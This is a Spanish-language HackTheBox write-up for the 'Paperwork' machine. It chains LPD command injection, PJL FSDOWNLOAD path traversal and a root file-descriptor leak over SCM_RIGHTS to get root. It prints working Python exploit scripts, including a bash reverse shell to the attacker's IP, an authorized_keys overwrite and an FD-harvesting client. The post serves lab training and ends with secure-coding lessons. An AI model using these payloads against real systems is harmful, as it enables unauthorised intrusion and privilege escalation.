---
title: "HTB Paperwork — Writeup"
date: 2026-07-12 00:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [lpd, pjl, jetdirect, python, privesc, unix-sockets, scm_rights, linux, easy]
image:
  path: /assets/img/posts/htb-paperwork-banner.png
  alt: HTB Paperwork
---

**Dificultad:** Fácil
**OS:** Linux (Ubuntu)
**Objetivo:** Comprometer una máquina de temporada de HackTheBox centrada en protocolos de impresión legacy reimplementados en Python (LPD y JetDirect/PJL), encadenando command injection, path traversal y una fuga de file descriptor vía `SCM_RIGHTS` hasta root.

---

## Resumen

**Paperwork** es una máquina de temporada de HackTheBox centrada enteramente en protocolos de impresión legacy reimplementados en Python: LPD (RFC 1179) en el puerto 1515 y JetDirect/PJL en el puerto 9100 (solo loopback). Ninguno de los dos requiere autenticación real, y ambos tienen bugs de sanitización de entrada que encadenan hasta root.

- **Acceso inicial (`lp`)**: command injection en el demonio LPD custom, vía un campo `job_name` sin sanitizar interpolado en un `subprocess.Popen(..., shell=True)`.
- **User (`archivist`)**: path traversal en el comando `FSDOWNLOAD` del emulador JetDirect/PJL, que permite sobrescribir `~archivist/.ssh/authorized_keys`.
- **Root**: un demonio adicional (`paperwork-daemon`, corre como root) escucha en un Unix socket y filtra un file descriptor abierto sobre un archivo de configuración root-only (`/etc/paperwork/admin_pins.conf`) vía `SCM_RIGHTS`, cuando detecta ciertas palabras clave en un log compartido — bypaseando por completo los permisos del sistema de archivos.

---

## 1. Reconocimiento

```bash
nuclei -u paperwork.htb
rustscan --addresses "paperwork.htb" -- -sC -sV
```

Puertos abiertos:

| Puerto | Servicio | Detalle |
|---|---|---|
| 22 | SSH | OpenSSH 10.0p2 Ubuntu |
| 80 | HTTP | nginx 1.28.0, "Intranet \| Document Archiving Service" |
| 1515 | ifor-protocol (nmap no lo reconoce) | Banner: `Archive_Printer is ready and printing.` |

Nikto no encontró nada relevante (2 hallazgos triviales de 6544 checks).

El banner de 1515 y el título de la web ("Document Archiving Service") ya apuntan a un protocolo de impresión — el 1515 es el puerto clásico de **LPD (Line Printer Daemon, RFC 1179)**.

---

## 2. Enumeración web

```bash
whatweb http://paperwork.htb
feroxbuster -u http://paperwork.htb -w raft-medium-directories.txt -x php,html,txt,pdf -t 50
```

Dos rutas relevantes:
- `/` — página estática con pistas: menciona `Compliance Level: RFC 1179`, cola `archive_intake`, y un enlace a `/download/archive`.
- `/download/archive` — descarga directa de `paperwork-archive-v1.02.zip`, que contiene el **código fuente completo** del demonio LPD (`server.py`). Exposición de código fuente por descuido de configuración — jugada maestra del diseñador de la máquina.

```bash
curl -s -o archive.zip http://paperwork.htb/download/archive
unzip archive.zip
```

---

## 3. Análisis del código fuente — `server.py` (puerto 1515)

```python
VALID_QUEUE = os.environ.get("LPD_QUEUE")
...
def handle_print_job(self, data):
    queue = data[1:].decode().strip()
    if queue not in VALID_QUEUE:          # <-- BUG 1: substring check, no lista
        ...
    ...
    job_name = "Unknown"
    for line in decoded_content.split('\n'):
        if line.startswith('J'):
            job_name = line[1:]
    ...
    subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)  # <-- BUG 2
```

Dos vulnerabilidades:

1. **`queue not in VALID_QUEUE`** — `VALID_QUEUE` es un string (viene de una env var), así que Python hace comprobación de substring, no de pertenencia a lista. Con `queue = ""` (vacío) el check siempre pasa (`"" in cualquier_string` es `True`), sin necesitar el nombre real de la cola.
2. **Command injection sin sanitizar** en `job_name`, interpolado directamente en un string ejecutado con `shell=True`. Rompiendo la comilla simple del `echo`, se inyecta cualquier comando.

### Explotación

El protocolo LPD (RFC 1179) simplificado que implementa el servidor:
1. Cliente envía `\x02` + nombre de cola + `\n` → servidor responde con ACKs.
2. Cliente envía un "control file": subcomando + `"<size> <filename>\n"`.
3. Cliente envía el contenido del control file; el servidor busca una línea que empiece por `J` (job name) y la usa (sin sanitizar) en el comando de logging.

```python
import socket

TARGET = "paperwork.htb"
PORT = 1515
LHOST = "10.10.14.X"   # tu IP de tun0 en la VPN de HTB
LPORT = 4444

payload_cmd = f'bash -c "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1"'
control_content = f"J' ; {payload_cmd} ; echo '\n".encode()
size = len(control_content)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TARGET, PORT))
s.send(b'\x02' + b'\n')                                          # queue vacía (bug del "in")
s.send(bytes([2]) + f" {size} cfA001paperwork\n".encode())       # header del control file
s.send(control_content)                                          # dispara la inyección
s.close()
```

Con un listener (`penelope -p 4444` en mi caso), esto da **shell inmediata como el usuario `lp`**.

> **Nota sobre iteración real:** el primer intento de reverse shell con comillas dobles anidadas falló silenciosamente (`Popen` no propaga stderr al cliente, así que "no pasó nada" sin ningún error visible). Antes de asumir que la inyección no funcionaba, la forma correcta de depurar fue: (1) confirmar la IP de la interfaz VPN correcta, (2) sustituir el payload por un callback HTTP trivial (`curl`) para confirmar RCE puro sin depender de la sintaxis de shell interactiva, y solo entonces (3) volver a la reverse shell. Aislar variables de una en una ahorra mucho tiempo frente a asumir que el vector entero está roto.

---

## 4. Enumeración post-explotación

```bash
ps aux
ss -tulnp
```

Hallazgos clave:

```
archivi+  983  /usr/bin/python3 /home/archivist/printer/jetdirect.py 9100 /home/archivist/printer/ .../commands.log
root     1476  /usr/bin/python3 /usr/bin/paperwork-daemon
root     966   /usr/bin/python3 /root/staging/CorpoSite/app.py     (proxied por nginx en :1337)
```

```
tcp  127.0.0.1:9100   LISTEN   (jetdirect.py, corre como archivist)
tcp  127.0.0.1:1337   LISTEN   (Flask app, corre como root, detrás de nginx)
```

El home de `archivist` (`/home/archivist`, `drwxr-x---`) es inaccesible para `lp`. `/etc/systemd/system/jetdirect.service` confirma que el segundo demonio de impresión (protocolo **JetDirect/PJL**, emulando el puerto 9100 típico de impresoras HP) corre como `archivist` — ese es el siguiente objetivo.

También se detectó `/run/paperwork/mgmt.sock` (socket Unix, `root:archivist`, modo `0660`) — inaccesible para `lp`, pero relevante más adelante para la escalada a root.

---

## 5. Vector 2 — JetDirect/PJL (puerto 9100) → usuario `archivist`

Al conectar y mandar un job PJL mínimo:
```python
payload = b'\x1b%-12345X@PJL JOB NAME="test"\n@PJL ENTER LANGUAGE=PCL\nHello\n\x1b%-12345X'
```
el servicio responde `OK\r\nOK\r\n` por cada comando `@PJL` reconocido — confirma que parsea comandos PJL línea por línea, igual que una impresora HP real.

### Callejón sin salida (documentado a propósito)

Mi hipótesis inicial, por analogía directa con el bug de `server.py`, fue que el campo `JOB NAME="..."` sufriría el mismo problema: path traversal en el nombre de archivo del "trabajo de impresión", o command injection al reutilizar el string en algún log. Invertí bastante tiempo en:

- Probar `JOB NAME="../../../tmp/test"` y variantes con distinta profundidad de `../`.
- Probar path absoluto (`/tmp/test`), asumiendo un posible bug de `os.path.join` con rutas absolutas.
- Probar inyección de comandos rompiendo comillas dobles, igual que en el bug de LPD.
- Forzar un crash del servicio para ver si `systemd` (con `Restart=on-failure`) dejaba algún dump legible.

Ninguna de estas pistas dio resultado verificable: el servidor devolvía `OK` de forma inconsistente (a veces 1, a veces 2 ACKs) pero **ningún archivo aparecía nunca en `/tmp`**, ni el conteo de ACKs correlacionaba de forma fiable con éxito/fracaso real. La lección aquí: cuando un oráculo (el conteo de respuestas) da señal contradictoria repetidamente, es mejor sospechar que se está sondeando el campo equivocado del protocolo, en vez de seguir puliendo el mismo payload.

El campo real explotable no era `JOB NAME` de un job LPD/PCL genérico, sino el comando **PJL nativo de sistema de archivos de impresora**, `@PJL FSDOWNLOAD` (comando real de PJL para "subir un archivo al dispositivo", con semántica de escritura del lado del cliente al "disco" de la impresora). Ya había probado este comando antes sin el prefijo de volumen (`NAME="/etc/passwd"`), y devolvía `FILEERROR=1` — un fallo de sintaxis a nivel de volumen, no un rechazo total. Faltaba el prefijo `0:/` (volumen 0, estándar en impresoras HP reales) para que el parser aceptara la ruta.

### Explotación real

```python
import socket

pub = open("id_ed25519.pub", "rb").read().strip() + b"\n"
body = b'@PJL FSDOWNLOAD NAME="0:/../.ssh/authorized_keys" SIZE=%d\r\n' % len(pub) + pub

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9100))
s.send(b"\x1b%-12345X" + body + b"\x1b%-12345X\r\n")
print(s.recv(200))   # -> b'OK\r\n'
s.close()
```

El `0:/../` sale del "volumen raíz" simulado (que corresponde al `WorkingDirectory` del proceso, `/home/archivist/printer/`) y aterriza en `/home/archivist/.ssh/authorized_keys`, sobrescribiéndolo con nuestra clave pública — el proceso corre como `archivist`, así que la escritura hereda esos permisos.

```bash
ssh -i id_ed25519 -o StrictHostKeyChecking=no archivist@127.0.0.1 'id; cat ~/user.txt'
# uid=1000(archivist) gid=1000(archivist) groups=1000(archivist)
# <USER_FLAG_REDACTED>
```

**User flag obtenida.** *(No se publica el valor mientras la máquina no esté retirada, según las normas de HTB.)*

---

## 6. Vector 3 — `paperwork-daemon` y `SCM_RIGHTS` → root

`/usr/bin/paperwork-daemon` es un script Python **world-readable** (`-rw-r--r-- root:root`), así que se puede leer directamente sin necesitar ningún privilegio adicional:

```python
LOG_PATH = "/home/archivist/printer/logs/commands.log"

def get_admin_secret():
    data = os.pread(admin_fd, 1024, 0).decode().strip()
    ...

def scan_for_malice():
    with open(LOG_PATH) as f:
        content = f.read().upper()
        return any(t in content for t in ["FSQUERY", "FSUPLOAD", "FSDOWNLOAD"])

def trigger_lockdown(conn):
    ...
    evidence_bundle = array.array("i", [log_fd, admin_fd])
    conn.sendmsg([msg], [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)])
    ...

def main():
    ...
    s.chown(socket_path, 0, 1000)   # root:archivist
    s.chmod(socket_path, 0o660)     # solo root y grupo archivist
    while True:
        conn, _ = s.accept()
        if scan_for_malice():
            trigger_lockdown(conn)   # <-- filtra FDs root por SCM_RIGHTS
        else:
            ...  # solo un hash SHA256 inútil
```

**La idea de diseño (con intención defensiva, pero mal ejecutada) es un honeypot de "detección de intrusión":** si el log de comandos de impresión contiene palabras que sugieren un ataque de sistema de archivos PJL (`FSDOWNLOAD`, que es justo lo que acabamos de usar), el demonio "responde" al presunto atacante enviándole el **contexto forense completo** — incluyendo, sin darse cuenta, un file descriptor ya abierto por root sobre el archivo de credenciales. `SCM_RIGHTS` transmite el *descriptor* en sí (el acceso ya concedido a nivel de kernel cuando root lo abrió), no una copia de datos sujeta a los permisos del receptor — así que cualquier proceso que reciba ese FD puede leer el archivo sin que sus propios permisos importen en absoluto.

Como `archivist`, con acceso ya al socket (`root:archivist`, `0660`):

```python
import socket, array, os

LOG = "/home/archivist/printer/logs/commands.log"
SOCK = "/run/paperwork/mgmt.sock"

with open(LOG, "a") as f:
    f.write("FSUPLOAD trigger-lockdown\n")   # dispara scan_for_malice()

s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect(SOCK)
fds = array.array("i")
msg, anc, flags, addr = s.recvmsg(4096, socket.CMSG_SPACE(2 * fds.itemsize))
for level, ctype, cdata in anc:
    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
        cdata = cdata[:len(cdata) - (len(cdata) % fds.itemsize)]
        fds.frombytes(cdata)

for fd in fds:
    print(os.pread(fd, 4096, 0).decode(errors="ignore"))
```

```
ADMIN_PASSWORD=<REDACTED>
```

Contraseña reutilizada directamente para `root`:

```bash
ssh -i id_ed25519 archivist@127.0.0.1 "echo '<ADMIN_PASSWORD>' | su -c 'id; cat /root/root.txt' root"
# uid=0(root) gid=0(root) groups=0(root)
# <ROOT_FLAG_REDACTED>
```

**Root flag obtenida.** *(Valor y contraseña omitidos mientras la máquina no esté retirada, según las normas de HTB.)*

---

## 7. Resumen de la cadena completa

```
nmap → 22/80/1515 abiertos
  └─ web → /download/archive filtra server.py (código fuente LPD)
       └─ bug 1: "in" sobre substring rompe el check de cola
       └─ bug 2: command injection en job_name (shell=True)
            └─ RCE como lp
                 └─ enumeración: jetdirect.py (9100, archivist), paperwork-daemon (root, mgmt.sock)
                      └─ PJL FSDOWNLOAD NAME="0:/../..." → path traversal
                           └─ sobrescribe ~archivist/.ssh/authorized_keys
                                └─ SSH como archivist → USER FLAG
                                     └─ dispara scan_for_malice() en commands.log
                                          └─ conecta a mgmt.sock → recibe FD root vía SCM_RIGHTS
                                               └─ lee /etc/paperwork/admin_pins.conf sin permisos
                                                    └─ su root (password reuse) → ROOT FLAG
```

## Lecciones / takeaways

- **Nunca interpolar entrada de usuario en `subprocess(..., shell=True)`**, ni siquiera para logging aparentemente inocuo — es el bug más antiguo del libro y sigue siendo la puerta de entrada más común.
- **Comprobaciones de pertenencia deben usar estructuras de datos correctas** (`in` sobre una lista/set, no sobre un string crudo desde una env var).
- **`SCM_RIGHTS` sobre Unix sockets transmite acceso real de kernel, no una simple referencia.** Cualquier diseño que envíe FDs a un peer debe tratar ese peer como si tuviera los mismos permisos que el proceso que abrió el archivo — en este caso, el "sistema de detección" se convirtió literalmente en el vector de fuga que pretendía vigilar.
- Cuando un oráculo de explotación (conteo de ACKs, presencia/ausencia de archivos) da resultados inconsistentes tras varios intentos, es más productivo cuestionar qué campo del protocolo se está atacando que seguir iterando variantes del mismo payload.
